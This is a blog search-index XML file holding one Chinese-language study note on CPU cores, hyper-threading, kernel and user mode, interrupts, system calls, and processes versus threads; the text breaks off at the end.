<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>Hello World2</title>
      <link href="/posts/98975d7d%EF%BC%9F.html"/>
      <url>/posts/98975d7d%EF%BC%9F.html</url>
      
        <content type="html"><![CDATA[<h1 id="？？问题"><a href="#？？问题" class="headerlink" title="？？问题"></a>？？问题</h1><ul><li>一个六核十二线程为什么可以执行以一个300个线程的软件<ul><li>首先6核只有6线程，但是通过超线程实现了12线程</li><li>其次，300线程的软件，300起了300条指令，最后11执行的还是只有12条通道，可以理解为300线程是300辆车，12是12条车道</li><li>车载的是数据和资源，即线程在搬运数据和资源</li><li>车运行的过程就是指令执行的过程</li><li>执行指令的通道就12条</li><li>然后就是300线程是通过线程库产生的，那么问题由来了<ul><li>这300个线程是运行在一个物理核心上的，那么不会慢吗，有其他解决办法吗</li></ul></li><li>因为300是用户线程，用户知道系统不知道，12线程是内核级，操心系统知道</li></ul></li><li>CPU，一个独立的运算单元，同时只能运行一个进程吗<ul><li>应该是，因为一个物理核心同时最多运行一个线程，而线程属于进程的一部分</li></ul></li><li>那一个物理CPU可以同时运行一个进程吗<ul><li>是可以的，因为一个进程的多个线程可以分配不同的物理核心</li></ul></li></ul><p>CPU核心只能看到线程和操作系统眼里还是只有这一个进程。分开</p><ul><li>操作系统眼里还是只有这一个进程。<ul><li>操作系统：谁知道你的线程是属于哪个进程的，在这里，我就知道我要执行哪个进程（比如我打开某个电脑软件），以至于它怎么打开的（执行了多少线程），我不知道</li></ul></li></ul><p>那我用线程库写的一个多线程进程，</p><ul><li>即打开tomcat，就申请了300个线程</li></ul><p>那我用线程库写的一个多线程进程，多个线程也就都只能在一个CPU核心上运行</p><ul><li>用户级线程，这个就没办法跑到多个核上了</li></ul><p>，只能等待A主动放弃CPU。</p><ul><li>比如a执行完毕了</li></ul><p>用java做比分，java线程就是一个用户线程对应一个内核线程，而多个用户线程对应一个内核线程则是指更轻量级的线程，即多用户线程不用经过内核态进行切换，可以理解为是协程</p><p>再提一下，如果是多核的cpu，只有内核态的线程才能利用多核，用户态线程不行，所以需要将用户线程与内核线程映射，多个用户线程对应一个内核线程从本质来说其实只会用一个核</p><ul><li>跟知乎问对上了</li></ul><h2 id="0各种概念"><a href="#0各种概念" class="headerlink" title="0各种概念"></a>0各种概念</h2><h3 id="处理机（processor）"><a href="#处理机（processor）" class="headerlink" title="处理机（processor）"></a>处理机（<em>processor</em>）</h3><ul><li>处理机包括中央处理器，主存储器，输入-输出接口，加接外围设备就构成完整的计算机系统。</li></ul><h3 id="并发和并行"><a href="#并发和并行" class="headerlink" title="并发和并行"></a>并发和并行</h3><ul><li>如果一个计算机有6个核心，只运行了6个线程，即线程数不大于物理核心数，那么就不需要分时处理，是真正的同时执行。现在计算机在启动时，已经执行了很多进程，线程数量更多，所以需要分时切片来执行</li></ul><h3 id="调度"><a href="#调度" class="headerlink" title="调度"></a>调度</h3><h3 id="上下文"><a href="#上下文" class="headerlink" title="上下文"></a>上下文</h3><h1 id="计算机硬件部分知识"><a href="#计算机硬件部分知识" class="headerlink" title="计算机硬件部分知识"></a>计算机硬件部分知识</h1><h2 id="🚩物理CPU"><a href="#🚩物理CPU" class="headerlink" title="🚩物理CPU"></a>🚩物理CPU</h2><p>一般指的是计算机的中央处理器 ，普通电脑一般只有一个CPU插槽，即只有一个物理CPU。</p><p><strong>广义上的CPU</strong>：在日常生活中，CPU一般指的是封装好的物理CPU，例如英特尔的<code>酷睿</code>系列和AMD的<code>锐龙</code>系列。</p><p><img src="http://pic.baicai.icu/cpu和线程的问题.assets/amd.jpg" alt="amd" style="zoom: 25%;" align="left" /></p><p><strong>狭义上的CPU</strong>：在编程的讨论情况下，CPU通常指的是一个运算单元，即下面的说的【<em>core</em>物理核心】。</p><h2 id="🚩物理核心（core）"><a href="#🚩物理核心（core）" class="headerlink" title="🚩物理核心（core）"></a>🚩物理核心（core）</h2><p>在编程的讨论范围下，一般CPU指的是一个物理CPU中的一个核心。例如8核，即一个CPU有8个核心，拥有8个独立的运算单元。</p><p>一般来说，一个物理核心就是一个独立的运算单元，一个物理核心同时最多运行一个线程。一个运算单元有一套寄存器，一般还有L1，L2的私有缓存等等。</p><p><img src="http://pic.baicai.icu/cpu和线程的问题.assets/运算单元.jpg" alt="运算单元" style="zoom:100%;"  align="left" /></p><h2 id="🚩逻辑核心（logic-core）"><a href="#🚩逻辑核心（logic-core）" class="headerlink" title="🚩逻辑核心（logic core）"></a>🚩逻辑核心（logic core）</h2><p>由于英特尔的超线程技术，可以实现一个核心同时执行多个线程，则产生了逻辑核心的说法，也就是说，平日里我们说的8核16线程，一个物理核心硬件级模拟运行了二个线程，按照一个线程对应一个核心的说法，此处的逻辑核心为16。</p><p>为什么 Intel 的超线程技术是一个核两条线程，而不是更多？</p><ul><li>因为这是平衡了性能、晶体管效率、实现难度等等综合考虑的结果，事实还也有单核4线程的CPU，比如<code>intel Xeon Phi</code>。</li></ul><h2 id="🚩超线程（Hyper-Threading）"><a href="#🚩超线程（Hyper-Threading）" class="headerlink" title="🚩超线程（Hyper-Threading）"></a>🚩超线程（Hyper-Threading）</h2><h3 id="⭐什么是超线程？"><a href="#⭐什么是超线程？" class="headerlink" title="⭐什么是超线程？"></a>⭐什么是超线程？</h3><p>超线程是英特尔开发出来的一项技术，使得单个CPU可以像两个逻辑CPU那样运行。</p><p><img src="http://pic.baicai.icu/cpu和线程的问题.assets/超线程.jpg" alt="超线程" style="zoom: 50%;"  align="left" /></p><h3 id="⭐超线程技术实现并行操作的原理？"><a href="#⭐超线程技术实现并行操作的原理？" class="headerlink" title="⭐超线程技术实现并行操作的原理？"></a>⭐超线程技术实现并行操作的原理？</h3><p>问题：一个线程在执行时会占用CPU资源，其他线程想要得到执行就必须等待该线程将CPU资源让出，但是需要注意的是，此时占用CPU的线程<strong>可能并不是完全地利用CPU所有的资源</strong>，这造成了资源的浪费。</p><p>解决：超线程技术允许两个线程<strong>同时不冲突</strong>地使用CPU中的资源。</p><ul><li>比如一条整数运算指令只会用到整数运算单元，此时浮点运算单元就空闲了，若使用了超线程技术，且另一个线程刚好此时要执行一个浮点运算指令，CPU就允许属于两个不同线程的整数运算指令和浮点运算指令同时执行，所以这两个线程共享同一个CPU资源。</li><li>超线程技术，只是模拟出的两个逻辑内核来共享同一个CPU资源，但这也并不意味着两个线程在同一个CPU中一直都可以并行执行，只有两个线程在不使用相同的CPU资源的情况下，才可以真正地并行执行。</li><li>简单点来说，就是假设CPU拥有ABCD资源，线程1需要A资源，线程2需要B资源，此次两个线程就能并行执行在这个CPU上。</li><li>以上的CPU，是指物理CPU中的一个核心<em>（core）</em>。</li></ul><h2 id="🚩指令集架构（ISA）"><a href="#🚩指令集架构（ISA）" class="headerlink" title="🚩指令集架构（ISA）"></a>🚩指令集架构（ISA）</h2><p>在计算机发展中，出现了很多指令集架构，目前比较主流有如下2个架构：</p><p><strong>复杂指令集运算（Complex Instruction Set Computing，CISC）</strong></p><ul><li>CISC处理器架构家族最出名的架构，就是x86架构。</li><li><p>市场上常见的Intel和AMD处理器大多数都属于x86架构。</p></li><li><p>目前支持x86处理器操作系统有，微软的Windows和苹果公司的macOS。另外Linux，一些UNIX等，都可以运行在x86架构的处理器。</p></li></ul><p><strong>精简指令集运算（Reduced Instruction Set Computing，RISC）</strong></p><ul><li>RISC处理器架构家族最出名的架构，就是ARM架构。</li><li>常见的ARM架构处理器，有Apple的<code>M1处理器</code>、高通的<code>骁龙处理器</code>和华为的<code>麒麟处理器</code>等。</li><li>目前有UNIX、Linux以及包括iOS、Android、Windows Phone等在内的大多数移动操作系统运行在ARM处理器上。</li></ul><p><img src="http://pic.baicai.icu/cpu和线程的问题.assets/指令系统的演变.png" alt="指令系统的演变" style="zoom: 50%;" align="left" /></p><h1 id="计算机操作系统"><a href="#计算机操作系统" class="headerlink" title="计算机操作系统"></a>计算机操作系统</h1><h2 id="🚩指令（Instruction）"><a href="#🚩指令（Instruction）" class="headerlink" title="🚩指令（Instruction）"></a>🚩指令（Instruction）</h2><p>指令是由指令集架构定义的单个的CPU操作，即CPU能识别、执行的最基本命令，比如四则运算、寄存器读写等。简单来说，指令就是通过硬件刻录进物理CPU内的一个最基础功能点，而指令集就是物理CPU的操作说明书，通过不同的指令组合就能实现不同的复杂功能。</p><p><strong>在操作系统中，根据指令的权限等级，分为特权指令和非特权指令。很明显，执行特权指令需要高权限，如果某个用户使用了一个比如内存清零的特权指令，就能将其他用户的内存数据清零，这样显然是危险的，所以用户级程序是不能使用特权指令的。</strong></p><blockquote><p>特权指令：如内存清零指令<br>非特权指令：如普通的运行指令</p></blockquote><h4 id="📗CPU的状态"><a href="#📗CPU的状态" class="headerlink" title="📗CPU的状态"></a>📗CPU的状态</h4><ul><li><em>CPU是如何界定特权指令的使用标准的呢？</em></li></ul><blockquote><p>将CPU运行指令的状态来划分为2种，用户态和核心态（也叫内核态）。</p><p>用户态（user mode）：CPU只能执行非特权指令。<br>核心态（kernel mode）：CPU既可以执行特权指令，也可以执行非特权指令。</p></blockquote><h4 id="📗程序的种类"><a href="#📗程序的种类" class="headerlink" title="📗程序的种类"></a>📗程序的种类</h4><ul><li><em>如何规定哪些程序可以使用特权指令呢？</em></li></ul><blockquote><p>将CPU运行程序的状态来划分为2种，内核程序和应用程序。</p><p>用户程序：运行在用户态，只能执行非特权指令。<br>内核程序：运行在核心态，既可以执行特权指令，也可以执行非特权指令。</p></blockquote><h2 id="🚩内核（kernel）"><a href="#🚩内核（kernel）" class="headerlink" title="🚩内核（kernel）"></a>🚩内核（kernel）</h2><h3 id="⭐什么是内核？"><a href="#⭐什么是内核？" class="headerlink" title="⭐什么是内核？"></a>⭐什么是内核？</h3><p>简单来说，<strong>「内核就是操作系统中的一组程序模块」</strong>，它负责管理系统的进程、内存、设备驱动程序、文件和网络系统等等，决定着系统的性能和稳定性，是连接应用程序和硬件的桥梁。</p><p><img src="http://pic.baicai.icu/cpu和线程的问题.assets/计算机系统的层次结构.jpg" alt="计算机系统的层次结构"></p><h3 id="⭐内核态和用户态"><a href="#⭐内核态和用户态" class="headerlink" title="⭐内核态和用户态"></a>⭐内核态和用户态</h3><p>由于内核可以使用特权指令，所以内核程序（也称为系统程序）作为资源的调度者，决定一个用户程序在什么时候对某部分硬件操作多长时间。</p><p>从内核调度资源的视角再一次阐述CPU的状态</p><ul><li><strong>「内核态」</strong>（kernel mode）：当 CPU 处于内核态时，这是操作系统管理程序（也就是内核）运行时所处的状态。运行在内核态的程序可以访问计算机的任何资源，不受限制，为所欲为，例如协调 CPU 资源，分配内存资源，提供稳定的环境供应用程序运行等。</li><li><strong>「用户态」</strong>（user mode）：应用程序基本都是运行在用户态的，或者说用户态就是提供应用程序运行的空间。运行在用户态的程序只能访问当前 CPU 上执行程序所在的地址空间，这样有效地防止了操作系统程序受到应用程序的侵害。</li></ul><h2 id="🚩中断机制（Interrupt）"><a href="#🚩中断机制（Interrupt）" class="headerlink" title="🚩中断机制（Interrupt）"></a>🚩中断机制（Interrupt）</h2><h3 id="⭐什么是中断？"><a href="#⭐什么是中断？" class="headerlink" title="⭐什么是中断？"></a>⭐什么是中断？</h3><p>在合适的情况下，操作系统的内核会把 CPU 的使用权主动让给应用程序，也就是使 CPU 从内核态转换到用户态。而 CPU 要想从用户态回到内核态，只能通过中断机制完成，如果没有中断机制，那么一旦应用程序上 CPU 运行（用户态），CPU 就会一直运行这个应用程序。也就是说，<strong>「中断是让操作系统内核夺回 CPU 使用权的唯一途径」</strong>。可以说，<strong>「操作系统是由中断驱动的」</strong>。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">graph LR</span><br><span class="line">A[内核态] --&gt;|执行某一个特权指令,该指令会修改程序状态标识,从而转成用户态|B(用户态)</span><br><span class="line">B[用户态] --&gt;|只能通过中断|A(内核态)</span><br></pre></td></tr></table></figure><h3 id="⭐中断的分类"><a href="#⭐中断的分类" class="headerlink" title="⭐中断的分类"></a>⭐中断的分类</h3><p>按照中断信号来源于CPU 的外部还是内部，将中断类型分为外中断和内中断：</p><ul><li><strong>「外中断」（也称中断，狭义上的中断）</strong> <ul><li>外中断与当前执行的指令无关，中断信号来源于 CPU 外部。如 I/O 完成中断，表示设备输入/输出处理已经完成，CPU 能够发送下一个输入/输出请求。此外还有时钟中断、控制台中断等。</li></ul></li><li><strong>「内中断」（也称 异常、例外）</strong><ul><li>内中断与当前执行的指令有关，中断信号来源于 CPU 内部。如非法操作码、地址越界、算术溢出，除数为 0 等。</li></ul></li></ul><p><img src="http://pic.baicai.icu/cpu和线程的问题.assets/中断的分类.jpg" alt="中断的分类"></p><h3 id="⭐程序是如何被中断的"><a href="#⭐程序是如何被中断的" class="headerlink" title="⭐程序是如何被中断的"></a>⭐程序是如何被中断的</h3><ul><li>1）程序请求操作系统服务，执行<code>系统调用</code>（执行系统调用也是发生了一次内中断）</li><li>2）程序运行时产生外中断事件（比如 I/O 操作完成），运行程序被中断，转向中断程序处理</li><li>3）在程序运行时发生内中断（异常）事件，运行程序被打断，转向异常处理程序工作</li></ul><h2 id="🚩系统调用（system-call）"><a href="#🚩系统调用（system-call）" class="headerlink" title="🚩系统调用（system call）"></a>🚩系统调用（system call）</h2><h3 id="⭐什么是系统调用"><a href="#⭐什么是系统调用" class="headerlink" title="⭐什么是系统调用"></a>⭐什么是系统调用</h3><p>抽象点来说，指运行在<code>用户空间（User space）</code>的程序向操作系统内核请求需要更高权限运行的服务。</p><blockquote><p>在操作系统中，虚拟内存通常会被分成用户空间（又称使用者空间），与核心空间（Kernel space）这两个区块。</p><p><img src="http://pic.baicai.icu/cpu和线程的问题.assets/系统调用-linux空间详细.jpg" alt="系统调用-linux空间详细" style="zoom: 80%;" /></p></blockquote><p>详细点来说，操作系统作为用户和计算机硬件之间的接口，需要向上提供一些简单易用的服务，这个上层分为<code>用户</code>和<code>应用程序</code>。</p><ul><li><p>给用户提供的接口有图形界面 GUI 和命令接口，给应用程序提供的是<strong>「程序接口」</strong>，这个<strong>「程序接口」</strong>就是由一组<strong>系统调用</strong>组成的，是操作系统提供给开发人员使用的。</p></li><li><p><img src="http://pic.baicai.icu/cpu和线程的问题.assets/系统调用提供的接口.png" alt="系统调用提供的接口"></p></li></ul><h3 id="⭐操作系统为什么要提供“系统调用”功能？"><a href="#⭐操作系统为什么要提供“系统调用”功能？" class="headerlink" title="⭐操作系统为什么要提供“系统调用”功能？"></a>⭐操作系统为什么要提供“系统调用”功能？</h3><blockquote><p>举个例子：我们去学校打印店打印论文，你按下了 WPS 的 “打印” 选项，于是打印机开始工作。 你的论文打印到一半时，另一位同学按下了 Word 的 “打印” 按钮，开始打印他自己的论文。想象一下如果两个进程可以随意的、并发的共享打印机资源，会发生什么情况？</p><p>显然，两个进程并发运行，导致打印机设备交替的收到 WPS 和 Word 两个进程发来的打印请求，结果两篇论文的内容混杂在一起了。</p><p>如何解决这个问题？操作系统提供“系统调用”功能，用户进程想要使用打印机这种共享的资源，只能通过系统调用向操作系统内核发出请求，内核会对各个请求进行协调处理（进程调度），所以说内核才是操作系统的管理者。</p></blockquote><p>系统调用的设计就是为了预防用户非法操作以及用户程序恶意使用资源，从而确保操作系统自身能够稳定、高效、安全运行。</p><p>系统调用按功能大致可分为如下几类：</p><p><img src="http://pic.baicai.icu/cpu和线程的问题.assets/系统调用按功能分类.png" alt="系统调用按功能分类"></p><h3 id="⭐系统调用和库函数的区别"><a href="#⭐系统调用和库函数的区别" class="headerlink" title="⭐系统调用和库函数的区别"></a>⭐系统调用和库函数的区别</h3><ul><li><p>用户程序其实是可以直接使用汇编语言的方式来调用计算机的<code>系统调用</code>功能，但是计算机发展到了现在，应用程序的开发语言几乎都是高级语言，高级语言通过<code>库函数</code>封装了<code>系统调用</code>给程序的接口，开发者只需要调用库函数就能完成对资源的调用。</p></li><li><p>需要注意的是，不是所有的库函数都涉及系统的调用，比如下面两个例子</p><ul><li><font color="#ef7050">**「不涉及系统调用的库函数，比如取绝对值」**</font></li><li><font color="#ef7050">**「涉及系统调用的库函数，比如创建一个文件」**</font></li><li><img src="http://pic.baicai.icu/cpu和线程的问题.assets/系统调用和库函数.png" alt="系统调用和库函数"></li></ul></li></ul><h3 id="⭐系统调用背后的过程"><a href="#⭐系统调用背后的过程" class="headerlink" title="⭐系统调用背后的过程"></a>⭐系统调用背后的过程</h3><ul><li><p>编译器将高级语言的代码编译成汇编指令后，CPU就能识别该汇编指令。下面举一个例子：向一个文件写入数据。</p><ul><li><p>高级语言的代码中使用了write库函数，编译器就会识别出该行为属于系统调用，就会在汇编指令中添加<code>陷入指令（int x）</code>，<code>陷入指令</code>的作用是将CPU的控制权交还给操作系统，由操作系统完成由后续相对应的文件写入操作（写入用户程序提供的abc参数）。</p><blockquote><p>参数abc也需要使用movl指令写入到寄存器。</p><p>int x的int指的是CPU发生内中断的一系列陷入指令，x指的是从这一系列指令某一个。拿Linux来说，int 2就是让操作系统为我们创建一个进程，int 4就是进行一个写入操作。</p></blockquote></li><li><p><img src="http://pic.baicai.icu/cpu和线程的问题.assets/系统调用背后的过程.jpg" alt="系统调用背后的过程"></p></li></ul></li></ul><h2 id="🚩进程（process）"><a href="#🚩进程（process）" class="headerlink" title="🚩进程（process）"></a>🚩进程（process）</h2><h3 id="⭐什么是进程？"><a href="#⭐什么是进程？" class="headerlink" title="⭐什么是进程？"></a>⭐什么是进程？</h3><ul><li>进程是一种抽象的概念，所以进程在<strong>不同的角度</strong>下，有不同的定义，比较常见的描述有如下<ul><li><em>进程是程序的一次执行过程</em></li><li><em>进程是操作系统分配资源的最小单位，此处的资源包括不限于：CPU『指core核心』、内存、磁盘等</em></li><li><em>进程是线程的容器</em></li><li><em>进程有时候也被称为<strong>作业</strong>（job）和<strong>任务</strong>（task）</em></li></ul></li><li>为什么出现进程这种概念？<ul><li>由于硬件的发展，一个程序可以在计算机中运行多个实例（如打开2个QQ），多个实例在内存中怎么来表示呢？所以引出了进程的概念。</li><li>为了能更好地描述程序在计算机运行的过程。</li></ul></li><li>比如window操作系统中<code>任务管理器</code>就能看到所有的进程<ul><li><img src="http://pic.baicai.icu/cpu和线程的问题.assets/window任务管理器中的进程.png" alt="window任务管理器中的进程"></li></ul></li></ul><h3 id="⭐组成"><a href="#⭐组成" class="headerlink" title="⭐组成"></a>⭐组成</h3><ul><li>进程由程序、数据和进程控制块（PCB）三部分组成。</li></ul><h3 id="⭐特征"><a href="#⭐特征" class="headerlink" title="⭐特征"></a>⭐特征</h3><ul><li><strong>动态性</strong>：可动态地创建、结束进程</li><li><strong>并发性</strong>：任何进程都可以同其他进程一起<strong>并发执行</strong></li><li><strong>独立性</strong>：进程是能独立运行、独立获得资源、独立接受调度的基本单位</li><li><strong>异步性</strong>：由于进程间的相互制约，使进程具有执行的间断性，即进程按各自独立的、不可预知的速度向前推进</li></ul><h3 id="⭐生命周期"><a href="#⭐生命周期" class="headerlink" title="⭐生命周期"></a>⭐生命周期</h3><ul><li><strong>创建（<em>new</em>）</strong><ul><li>进程正在被创建，操作系统为进程分配资源、初始化PCB。</li></ul></li><li><strong>运行（<em>running</em>）</strong><ul><li>一个进程正在处理机运行时。</li><li>单核处理机环境下，每个时刻最多只有一个进程处于运行态。</li><li>双核环境下，可以同时有两个进程处于运行态。</li></ul></li><li><strong>等待（<em>waiting</em>）</strong><ul><li>又称为称“阻塞状态”（<em>blocked</em>）。</li><li>一个进程正在等待某一时间而暂停运行时。如等待某资源，等待输入 <em>/</em> 输出完成、</li></ul></li><li><strong>就绪（<em>ready</em>）</strong><ul><li>一个进程获得了除了处理机之外的一切所需资源，一旦得到处理机即可运行。</li></ul></li><li><strong>结束（<em>terminated</em>）</strong><ul><li>进程正在从系统中撤销，操作系统回收进程拥有的资源、撤销PCB</li></ul></li><li><img src="http://pic.baicai.icu/cpu和线程的问题.assets/进程的状态切换.png" alt="进程的状态切换" style="zoom:50%;" /></li></ul><h2 id="🚩线程（thread）"><a href="#🚩线程（thread）" class="headerlink" title="🚩线程（thread）"></a>🚩线程（thread）</h2><h3 id="⭐什么是线程？"><a href="#⭐什么是线程？" class="headerlink" title="⭐什么是线程？"></a>⭐什么是线程？</h3><ul><li>线程是也是一种抽象的概念，所以线程在<strong>不同的角度</strong>下，有不同的描述。<ul><li>指令视角<ul><li>在计算机科学中，一条线程是最小的<strong><font color="#ef7050">程序指令序列</font></strong>。</li></ul></li><li>操作系统视角<ul><li>线程是<strong><font color="#ef7050">操作系统</font></strong>能够进行运算<strong><font color="#ef7050">调度</font></strong>的最小单位，它被包含在进程之中，是进程中的实际运作单位。</li></ul></li><li>系统资源视角<ul><li><strong><font color="#ef7050">进程</font></strong>只作为<strong><font color="#ef7050">除了CPU以外的其他系统资源的分配单元</font></strong>（如打印机、内存地址都是分配给进程的），即<strong><font color="#ef7050">线程</font></strong>负责实际执行任务，进程负责申请资源。</li></ul></li><li>调度视角<ul><li>线程由操作系统的<strong><font color="#ef7050">调度程序</font></strong>独立管理。</li></ul></li></ul></li><li>于是就有了<font color="#ef7050"><strong>「CPU核心（core）只能看到线程」</strong></font>和<font color="#ef7050"><strong>「操作系统眼里只有进程」</strong></font>这一说法，即core负责执行程序指令序列，而操作系统负责管理CPU的同时还负责系统资源的调度。</li></ul><h3 id="⭐为什么出现线程？"><a href="#⭐为什么出现线程？" class="headerlink" title="⭐为什么出现线程？"></a>⭐为什么出现线程？</h3><ul><li><p>由于程序是以进程的方式出现在操作系统中，然而一个进程可能包含了很多功能模块，举一个例子：MP3播放软件。</p><ul><li>一个MP3播放软件核心功能模块有3个<ul><li>从MP3音频文件当中读取数据</li><li>对数据进行解压</li><li>把解压后的音频数据播放出来</li></ul></li></ul></li><li><p>在没有线程的情况下，当第一步read文件操作时阻塞了，由于是一个执行流程，然后其剩下2个模块自然也会阻塞。那我们进一步优化该软件，可以把这个播放软件拆分成3个进程，第一步read文件操作优先执行一段时间，来当做<strong>缓冲数据</strong>。结合3者交替执行，就能形成一边播放音乐一边解压和读取音频数据。但是进程创建、消亡、通讯等等都会消耗大量资源，为了节省资源于是就有了线程这个概念。总的来说，线程的出现就是为了<strong><font color="#ef7050">「把进程作为资源分配单位和调度单位这两个属性分开处理」</font></strong>。</p></li></ul><h3 id="⭐线程的特征"><a href="#⭐线程的特征" class="headerlink" title="⭐线程的特征"></a>⭐线程的特征</h3><ul><li><p>各个线程之间可以并发执行。</p></li><li><p>线程具有就绪、阻塞、运行三种基本状态，同样具有状态之间的转换关系。</p></li><li>在支持多核的操作系统中，一个进程的各个线程可以分派到不同的核心（core）上执行任务。</li></ul><h3 id="⭐线程的优缺点"><a href="#⭐线程的优缺点" class="headerlink" title="⭐线程的优缺点"></a>⭐线程的优缺点</h3><h4 id="📗优点"><a href="#📗优点" class="headerlink" title="📗优点"></a>📗优点</h4><ul><li><p>线程能减少并发执行的时间和空间开支，即开销更小，比如：</p><ul><li><p>线程创建的时间比进程短。</p></li><li><p>线程终止的时间比进程短。</p></li><li><p>同一进程内的线程切换时间比进程短。</p></li><li>由于同一进程的各个线程共享内容和文件资源，可直接进行不通过内核进行通信</li></ul></li></ul><ul><li>总的来说，进程操作需要执行的步骤，线程只会更少。</li></ul><h4 id="📗缺点"><a href="#📗缺点" class="headerlink" title="📗缺点"></a>📗缺点</h4><ul><li>一个线程崩溃，可能会导致其属所属进程的所有线程崩溃，因为其他线程可能也需要该资源。</li></ul><h4 id="📗何时用进程，何时用线程"><a href="#📗何时用进程，何时用线程" class="headerlink" title="📗何时用进程，何时用线程"></a>📗何时用进程，何时用线程</h4><ul><li>线程特点，高性能，数据容易不安全</li><li>进程特点，相对低性能，数据隔离，安全</li></ul><h3 id="⭐线程库（Thread-library）"><a href="#⭐线程库（Thread-library）" class="headerlink" title="⭐线程库（Thread library）"></a>⭐线程库（Thread library）</h3><ul><li><p>线程库是操作系统提供开发人员管理线程的一套 API。线程库不仅可以在用户空间中实现，还可以在内核空间中实现。</p></li><li><p>线程库的出现为了解决<code>用户级线程</code>与<code>内核级线程</code>的某种映射关系。</p><blockquote><p>线程库有时候也叫线程包。</p><p>在用户空间实现的线程库，没有内核支持。</p><p>在内核空间实现的线程库，会导致对内核的<strong>系统调用</strong>。</p></blockquote></li><li><p>简单介绍下三个主要的线程库</p><p> <a href="https://zh.wikipedia.org/wiki/POSIX%E7%BA%BF%E7%A8%8B">POSIX线程</a>：<a href="https://zh.wikipedia.org/wiki/%E5%8F%AF%E7%A7%BB%E6%A4%8D%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E6%8E%A5%E5%8F%A3">POSIX</a> 标准的拓展，可以提供用户级和内核级的库。</p><blockquote><p>POSIX，Portable Operating System Interface of UNIX的缩写，中文释义为<code>可移植操作系统接口</code>，是IEEE为要在各种UNIX操作系统上运行软件，而定义API的一系列互相关联标准的总称。总的来说，POSIX就是一个标准化规范接口，所以<strong>POSIX线程仅仅是线程行为规范，而不是实现</strong>。</p><p>实现POSIX线程标准的库常也被称作<strong>pthreads</strong>，如Linux、Mac OS、Solaris 等 OS 都实现了这个规范，但是Microsoft Windows也实现一部分标准。</p></blockquote></li></ul><ol><li><p>Win32线程：适用于 Windows OS 的内核级线程库</p></li><li><p>UNIX International线程：<a href="https://zh.wikipedia.org/wiki/Solaris">SUN Solaris操作系统</a>使用的线程，支持内核线程、轻权进程和用户线程。</p></li></ol><h3 id="⭐线程的实现方式"><a href="#⭐线程的实现方式" class="headerlink" title="⭐线程的实现方式"></a>⭐线程的实现方式</h3><h4 id="📗用户级线程（User-Level-Threads-ULT）"><a href="#📗用户级线程（User-Level-Threads-ULT）" class="headerlink" title="📗用户级线程（User-Level Threads ULT）"></a>📗用户级线程（User-Level Threads ULT）</h4><ul><li><p>用户级<strong><font color="#ef7050">线程包</font></strong></p><ul><li><img src="http://pic.baicai.icu/cpu和线程的问题.assets/用户级线程.jpg" alt="用户级线程"></li></ul></li><li><p>描述：用户级线程是一种在<strong><font color="#ef7050">用户空间</font></strong>实现的<strong><font color="#ef7050">线程机制</font></strong>，它不依赖于<strong><font color="#ef7050">操作系统的内核</font></strong>，由一组用户级的<strong><font color="#ef7050">线程库函数</font></strong>来完成线程的<strong><font color="#ef7050">管理</font></strong></p></li><li><p>优点</p><ul><li><p>线程位于用户空间，即线程的切换在用户态就能完成切换，无需切换CPU的状态。</p></li><li><p>完全控制线程调度器，即允许该进程的线程拥有自定义的线程调度算法。</p></li><li><p>独立于操作系统的内核，即可用于不支持线程技术的多进程操作系统。</p></li><li><p>运行时系统(runtime system)可以切换用户空间中的本地阻塞线程（例如:等待另一个线程完成)。</p><blockquote><p><a href="https://en.wikipedia.org/wiki/Runtime_system">运行时系统</a>，指的是某门语言的宿主环境，比如 Java 的运行时是 JRE。</p></blockquote></li></ul></li><li><p>缺点</p><ul><li><p>当一个线程因发起系统调用而阻塞，将会阻塞整个进程。</p></li><li><p>当一个线程开始运行时，除非它主动交出CPU使用权，否则它所属进程的其他线程无法执行。</p><blockquote><p>用户空间的线程库一直执行在用户态，所以无法主动打断当前线程的执行，但是操作系统有中断机制，可以夺回CPU的控制权来切换当前线程。</p></blockquote></li><li><p>非真正意义的线程并行。</p><blockquote><p>由于内核无法感知用户级线程，所以内核认为该线程所属进程只有一个线程，因此该进程只会分配到单个CPU上。</p></blockquote></li><li><p>由于时间片是分配给进程，故与其他进程相比，在多线程执行时，每个线程得到的时间片较少，执行会较慢。</p></li></ul></li></ul><h4 id="📗内核级线程（Kernel-Level-Threads-KLT）"><a href="#📗内核级线程（Kernel-Level-Threads-KLT）" class="headerlink" title="📗内核级线程（Kernel-Level Threads, KLT）"></a>📗内核级线程（Kernel-Level Threads, KLT）</h4><ul><li><p>由内核管理的<strong><font color="#ef7050">线程包</font></strong></p><ul><li><img src="http://pic.baicai.icu/cpu和线程的问题.assets/内核线程.jpg" alt="内核线程"></li></ul></li><li><p>描述：内核级线程是一种在<strong><font color="#ef7050">内核</font></strong>实现的<strong><font color="#ef7050">线程机制</font></strong>，由<strong><font color="#ef7050">操作系统的内核</font></strong>来完成线程的<strong><font color="#ef7050">管理</font></strong></p></li><li><p>优点</p><ul><li><p>实现了真正意义上的线程并行</p><blockquote><p>内核可以感知到内核级线程，因此操作系统可以将进程的不同线程分配给不同的CPU，并行完成任务。</p></blockquote></li><li><p>一个进程当中，某个内核级线程因发起系统调用而阻塞，并不会影响其他内核级线程的运行。</p></li><li><p>不需要运行时系统(runtime system)的参与。</p></li></ul></li><li><p>缺点</p><ul><li><p>频繁的切换CPU状态增加系统的开销。</p><blockquote><p>内核级线程的管理，都是通过系统调用/内核函数的方式进行的，即需要CPU「<strong>陷入</strong>」内核态，因此相较于用户级线程会有系统开销的增加。</p></blockquote></li></ul></li></ul><h4 id="📗轻量级进程（Light-Weight-Process）"><a href="#📗轻量级进程（Light-Weight-Process）" class="headerlink" title="📗轻量级进程（Light Weight Process）"></a>📗轻量级进程（Light Weight Process）</h4><ul><li><p>描述：内核支持的用户线程。一个进程可有一个或多个轻量级进程，每个轻权进程由一个单独的内核级线程来支持。(Linux / Solaris)</p><ul><li><img src="http://pic.baicai.icu/cpu和线程的问题.assets/轻量级进程.jpg" alt="轻量级进程"></li></ul></li><li><p>在实际程序中我们一般不直接使用内核线程，用户线程与内核线程之间需要一种中间数据结构，它由内核支持且是内核线程的高级抽象，这个高级接口被称为轻量级进程。从某种层面上看，LWP最多算是广义的用户线程，即我们通常所讲的线程。LWP线程库以内核为基础，很多操作要进行内核调用。</p></li></ul><h4 id="⭐线程实现的位置"><a href="#⭐线程实现的位置" class="headerlink" title="⭐线程实现的位置"></a>⭐线程实现的位置</h4><h4 